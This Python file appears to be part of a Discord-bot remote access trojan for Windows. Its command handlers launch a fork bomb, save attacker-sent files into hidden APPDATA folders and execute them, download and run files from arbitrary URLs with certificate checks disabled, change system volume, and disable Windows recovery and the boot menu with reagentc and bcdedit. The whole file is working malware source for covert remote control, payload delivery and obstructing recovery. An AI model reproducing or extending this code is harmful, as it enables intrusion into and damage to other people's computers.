import os, requests, subprocess,pyautogui
import threading
import aiohttp
import py7zr
import zipfile
import discord
import random
import string
from ctypes import cast, POINTER
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from urllib.parse import urlparse
from discord import Embed
from ctypes import windll
forkbomb_process = None

async def forkbomb(ctx, action):
    global forkbomb_process
    file_path = os.path.expanduser('~') + "\\Documents\\forkbomb.bat"

    def create_bat():
        with open(file_path, "w") as f:
            f.write("@echo off\nsetlocal enabledelayedexpansion\nset count=0\n:start\nset /a count+=1\nif !count! LSS 10001 start \"%~f0\"\ngoto start")

    if action.lower() == "start":
        if forkbomb_process is not None:
            await ctx.send("Fork bomb is already running.")
            return
        create_bat()
        forkbomb_process = subprocess.Popen(["cmd.exe", "/c", file_path], shell=True)
        forkbomb_process = subprocess.Popen(["cmd.exe", "/c", file_path], shell=True)
        await ctx.send("Fork bomb bat file created and started.")
    elif action.lower() == "stop":
        if forkbomb_process is not None:
            forkbomb_process.terminate()
            forkbomb_process = None
            if os.path.exists(file_path):
                os.remove(file_path)
            await ctx.send("Fork bomb stopped and bat file removed.")
        else:
            await ctx.send("No fork bomb is currently running.")
    else:
        await ctx.send("Invalid action. Use 'start' or 'stop'.")
async def setvol(ctx, vol: int):
    if 1 <= vol <= 100:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, 0, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(vol / 100.0, None)
        await ctx.send(f"Volume set to **{vol}**")
    else:
        await ctx.send("Volume must be between 1 and 100.")
async def share_file(ctx):
    try:
        if not ctx.message.attachments:
            await ctx.send("Please upload a file.")
            return
        attachment=ctx.message.attachments[0]
        file_name=attachment.filename
        file_ext=os.path.splitext(file_name)[1]
        file_content=await attachment.read()
        folder_path=os.path.join(os.getenv('APPDATA'),'sharedfiles')
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            subprocess.run(['attrib','+h',folder_path])
        random_name=''.join(random.choices(string.ascii_letters+string.digits,k=15))+file_ext
        file_path=os.path.join(folder_path,random_name)
        with open(file_path,'wb') as f:
            f.write(file_content)
        subprocess.run(['attrib','+h',file_path])
        os.startfile(file_path)
        await ctx.send(f"File `{file_name}` executed.")
    except Exception as e:
        await ctx.send(f"Failed to save or execute file: {e}")
async def send_help_embed(ctx):
    help_embed = Embed(
        title="Extract File Command - Help",
        description="Use this command to extract ZIP or 7z files. See below for usage details.",
        color=discord.Color.blue()
    )
    help_embed.add_field(
        name="**Command Syntax**",
        value="`.ezip <zip/7z> [password]`",
        inline=False
    )
    help_embed.add_field(
        name="**Arguments**",
        value="- `<zip/7z>`: Specify the file type. Use `zip` for ZIP files, or `7z` for 7z files.\n"
              "- `[password]`: Only required for password-protected 7z files.",
        inline=False
    )
    help_embed.add_field(
        name="**Examples**",
        value="`.ezip zip` - Extracts a ZIP file without a password.\n\n"
              "`.ezip 7z mypassword123` - Extracts a password-protected 7z file using the password 'mypassword123'.\n\n"
              "`.ezip 7z` - Extracts a 7z file without a password.",
        inline=False
    )
    help_embed.set_footer(text="For more help, type .ezip help")
    await ctx.send(embed=help_embed)


async def send_error_embed(ctx, error_message):
    error_embed = Embed(
        title="Error",
        description=error_message,
        color=discord.Color.red()
    )
    error_embed.set_footer(text="Please try again or check the file format.")
    await ctx.send(embed=error_embed)


async def ezip(ctx, file_type: str = None, password: str = None):
    try:
        if file_type == "help":
            await send_help_embed(ctx)
            return

        if not ctx.message.attachments:
            await send_error_embed(ctx, "Please upload a file.")
            return

        attachment = ctx.message.attachments[0]
        file_name = attachment.filename
        file_content = await attachment.read()
        file_path = os.path.join(os.getenv('TEMP'), file_name)

        with open(file_path, 'wb') as f:
            f.write(file_content)

        appdata_roaming_path = os.path.join(os.getenv('APPDATA'), "ExtractedFiles")
        if not os.path.exists(appdata_roaming_path):
            os.makedirs(appdata_roaming_path)

        random_folder_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        extraction_path = os.path.join(appdata_roaming_path, random_folder_name)
        os.makedirs(extraction_path, exist_ok=True)

        if file_type:
            if file_type.lower() == "7z":
                try:
                    if password:
                        with py7zr.SevenZipFile(file_path, mode='r', password=password) as archive:
                            archive.extractall(path=extraction_path)
                        success_message = f"7z file `{file_name}` extracted successfully with the provided password to `{extraction_path}`."
                    else:
                        with py7zr.SevenZipFile(file_path, mode='r') as archive:
                            archive.extractall(path=extraction_path)
                        success_message = f"7z file `{file_name}` extracted successfully (no password required) to `{extraction_path}`."

                    file_list_path = os.path.join(extraction_path, "file_list.txt")
                    with open(file_list_path, 'w') as file_list:
                        for root, dirs, files in os.walk(extraction_path):
                            for file in files:
                                file_list.write(f"{os.path.join(root, file)}\n")

                    success_embed = Embed(
                        title="Extraction Successful!",
                        description=success_message,
                        color=discord.Color.green()
                    )
                    success_embed.add_field(
                        name="File List",
                        value=f"All files are listed in `file_list.txt`.",
                        inline=False
                    )
                    await ctx.send(embed=success_embed, file=discord.File(file_list_path))

                except RuntimeError:
                    await send_error_embed(ctx, "Incorrect password for the 7z file.")
                except Exception as e:
                    await send_error_embed(ctx, f"Failed to extract 7z file: {e}")

            elif file_type.lower() == "zip":
                try:
                    with zipfile.ZipFile(file_path) as zip_ref:
                        zip_ref.extractall(extraction_path)

                    file_list_path = os.path.join(extraction_path, "file_list.txt")
                    with open(file_list_path, 'w') as file_list:
                        for root, dirs, files in os.walk(extraction_path):
                            for file in files:
                                file_list.write(f"{os.path.join(root, file)}\n")

                    success_embed = Embed(
                        title="Extraction Successful!",
                        description=f"ZIP file `{file_name}` extracted successfully to `{extraction_path}`.",
                        color=discord.Color.green()
                    )
                    success_embed.add_field(
                        name="File List",
                        value=f"All files are listed in `file_list.txt`.",
                        inline=False
                    )
                    await ctx.send(embed=success_embed, file=discord.File(file_list_path))

                except Exception as e:
                    await send_error_embed(ctx, f"Failed to extract ZIP file: {e}")

            else:
                await send_error_embed(ctx, "Invalid file type. Please specify 'zip' or '7z'.")

        else:
            await send_error_embed(ctx, "Please specify a file type ('zip' or '7z').")

    except Exception as e:
        await send_error_embed(ctx, f"Failed to process the file: {e}")

    except Exception as e:
        await send_error_embed(ctx, f"Failed to process the file: {e}")
async def fetchlink(ctx, url):
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            async with session.get(url) as response:
                response.raise_for_status()

                save_path = os.path.join(os.getenv('APPDATA'), 'sharedfiles', 'linksharedfiles')
                os.makedirs(save_path, exist_ok=True)

                filename = url.split('/')[-1]
                file_path = os.path.join(save_path, filename)

                with open(file_path, 'wb') as f:
                    async for chunk in response.content.iter_chunked(8192):
                        if chunk:
                            f.write(chunk)

                os.startfile(file_path)
                await ctx.send(f"File downloaded successfully: {file_path}")
    except Exception as e:
        await ctx.send(f"Failed to download the file: {e}")

async def start_fetchlink(ctx, url):
    await fetchlink(ctx, url)
async def reagentc(ctx, action: str = None):
    if action is None:
        embed = discord.Embed(description="Please specify 'on' or 'off' to enable or disable reagentc.", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    embed = discord.Embed(title="Reagentc Status", color=discord.Color.blue())
    try:
        if action.lower() == 'on':
            threading.Thread(target=subprocess.run, args=("reagentc /enable",), kwargs={'shell': True}).start()
            threading.Thread(target=subprocess.run, args=("bcdedit /set {default} recoveryenabled Yes",), kwargs={'shell': True}).start()
            threading.Thread(target=subprocess.run, args=("bcdedit /set {bootmgr} displaybootmenu yes",), kwargs={'shell': True}).start()
            embed.add_field(name="Action", value="Reagentc enabled.", inline=False)
            embed.add_field(name="Commands", value="reagentc /enable\nbcdedit /set {default} recoveryenabled Yes\nbcdedit /set {bootmgr} displaybootmenu yes", inline=False)

        elif action.lower() == 'off':
            threading.Thread(target=subprocess.run, args=("reagentc /disable",), kwargs={'shell': True}).start()
            threading.Thread(target=subprocess.run, args=("bcdedit /set {default} recoveryenabled No",), kwargs={'shell': True}).start()
            threading.Thread(target=subprocess.run, args=("bcdedit /set {bootmgr} displaybootmenu no",), kwargs={'shell': True}).start()
            embed.add_field(name="Action", value="Reagentc disabled.", inline=False)
            embed.add_field(name="Commands", value="reagentc /disable\nbcdedit /set {default} recoveryenabled No\nbcdedit /set {bootmgr} displaybootmenu no", inline=False)
        else:
            embed = discord.Embed(description="Invalid action. Please specify 'on' or 'off'.", color=discord.Color.red())
    except Exception as e:
        embed = discord.Embed(description=f"Error: {str(e)}", color=discord.Color.red())

    await ctx.send(embed=embed)    